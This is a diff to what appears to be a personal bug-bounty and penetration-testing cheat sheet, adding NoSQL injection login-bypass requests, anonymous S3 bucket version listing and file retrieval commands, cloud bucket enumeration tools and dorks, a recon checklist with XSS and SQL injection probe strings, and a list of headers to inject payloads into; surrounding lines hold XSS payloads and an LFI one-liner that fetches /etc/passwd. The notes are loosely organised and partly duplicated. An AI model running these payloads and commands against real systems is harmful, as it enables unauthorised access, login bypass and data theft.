@@ -5338,6 +5338,27 @@ Thanks For Reading….!
 
 CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
                  
+
+
+
+       NOSQL INJECTION      NOSQL INJECTION       NOSQL INJECTION 
+
+POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: “mypass”}
+
+In order to test if the login is vulnerable to NoSQL injection, we can supply a JSON input object as follows:
+POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: {‘$gt’: “”}} In cases where the application doesn’t use JSON as input, it’s still possible to inject an input object by passing an array object in the parameters request, as shown below:
+POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/x-www-form-urlencoded user=admin&password[$ne]=
+
+
+ In both the above cases, we’re able to bypass the login and access the application
+       
+       
+                 
+                 
+                 CR/LF (Carriage Return/Line Feed) Injection       CR/LF (Carriage Return/Line Feed) Injection
+
+CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
+                 
                  
                  
 
@@ -5384,7 +5405,7 @@ echo "http://testphp.vulnweb.com" | httpx -x all -probe -http-proxy http://127.0
 subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
 
 
-fuff scaning " a detailed guide"
+FUFF SCANING " A DETAILED GUIDE"
 simple attack
 ffuf -u http://testphp.vulnweb.com/FUZZ/ -w dict.txt
      content discovery
@@ -5849,8 +5870,10 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
 "/><details/open/ontoggle=promt(1)>
 
 "onfocus="alert(1)"autofocus="abc
+      
 
-     LOCAL FILL INCLUSION
+                 
+    LOCAL FILL INCLUSION
    gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
    
    Open-redirect
@@ -5895,8 +5918,7 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
    cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
    
    
-    Extracts Juicy Informations  Extracts Juicy Informations    Extracts Juicy Informations
-    for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
+
     
     Find Subdomains TakeOver
     subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
@@ -5965,6 +5987,16 @@ curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/dat
   axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt
   
   
+ 
+  AWS  AND CLOUD TOOLS
+  https://github.com/mosesrenegade/PMapper
+  For Amazon S3 buckets, try the “AWSBucketDump” tool by Jordan Potti  https://github.com/jordanpotti/AWSBucketDump 
+For DigitalOcean Spaces, try the “Spaces-Finder” tool by Appsecco: https://github.com/appsecco/spaces-finder 
+
+For GCP Storage, try the “GCPBucketBrute” tool by RhinoSecurityLabs:   https://github.com/RhinoSecurityLabs/GCPBucketBrute
+
+ For Azure Storage, try the “MicroBurst” tool by NetSPI: https://github.com/NetSPI/MicroBurst 
+  
   
   
   
@@ -6000,6 +6032,12 @@ html:"AWS Elastic Beanstalk overview"
 html:"OpenSearch Dashboards"
 "X-Amz-Server-Side-Encryption"
 
+
+    Example Google Dorking Syntax
+site:websitename.com inurl:".s3.amazonaws.com"
+
+site:websitename.com inurl:"storage.googleapis.com"
+
  AWS Access Key 
 
  ./enumerate-iam.py — access-key AKIA… — secret-key StF0q…
@@ -6012,7 +6050,23 @@ html:"OpenSearch Dashboards"
  cat jira_host.txt | nuclei -var username=email.txt -var password=pass.txt -t jira.yaml -attack-type clusterbomb
 
 
+  tip  tip
+   /aws-s3-bucket-versioning-discloses-secrets-      in web app                       https://osintteam.blog/aws-s3-bucket-versioning-discloses-secrets-1d63fbe498ab
+   
+     nmap -sVC -p- -T4 16.171.123.169 -vv
+         aws s3 ls s3://<BUCKET_NAME> --no-sign-request [Anonymous Access]
+         aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
+         aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh" old_auth.js --no-sign-request
+         aws configure
+aws sts get-caller-identity [Checking Identity]
+
+
+
+      LLM HACKING       LLM HACKING        LLM HACKING
+
  
+
+
 
 
 
@@ -6119,3 +6173,64 @@ An easy path traversal just by finding attack surface others hadn't.
 
 
       art-of-monitoring-bug-bounty-programs
+        
+        
+        
+        
+        First off all, is portscan in scope? If yes, portscan
+Look for webservers
+Try to find subdomains 
+Try to find other webservers on said server
+Try to do content discovery
+Try to do dorking on found from before
+Try to find anything on github related
+Try to take screenshots with something like aquatone
+Try to look at any kind of custom login pages, try content discovery more
+Try to look for any register on site and IDOR
+Try to look for XSS by having '"><img src=x>${{7*2}} at the very least in every field where possible
+Try to look for SQLi with same and looking out of SQL errors
+You can use these to fuzz the fu--ers
+Try to check all CSRF tokens on forms where they need be or generally set and verify it is checked
+Change GET to POST and reverse or try PUT or DELETE on endpoint
+NoSQLi? XXE? 
+Any open redirects? 
+Throw some LFI and RFI in the mix! 
+And the best of all? Business logic! 
+
+Found an API?! YES! LETS GO!! 
+Stay tuned for my API hacking post and let me know what I missed <3
+        
+        
+        
+        EXCEPT   EXCEPT                              TRY SQL ,XSS,SSRF ON THIS HEADERS
+        
+        
+        "Cookie": "test{payload}",
+"User-Agent": "test{payload}",
+"Location": "test{payload}",
+"Origin": "test{payload}",
+"Referer": "test{payload}",
+"Profile": "test{payload}",
+"X-Host": "test{payload}",
+"Via": "test{payload}",
+"True-Client-IP": "test{payload}",
+"X-Forwarded-For": "test{payload}",
+"Forwarded": "for=spoofed;{payload}",
+"X-Wap-Profile": "test{payload}",
+"Destination": "test{payload}",
+"Contact": "test{payload}",
+"X-Originating-IP": "test{payload}",
+"X-Original-URL": "test{payload}",
+"Client-IP": "test{payload}",
+"X-HTTP-DestinationURL": "test{payload}",
+"API-Version": "test{payload}",
+"Proxy": "test{payload}",
+"Referrer": "test{payload}",
+"CF-Connecting_IP": "test{payload}",
+"X-Forwarded-Proto": "test{payload}",
+"Proxy-Host": "test{payload}",
+"From": "test{payload}",
+"Client-IP": "test{payload}",
+"X-Forwarded-Server": "test{payload}",
+"X-Arbitrary": "test{payload}",
+"X-Real-IP": "test{payload}"
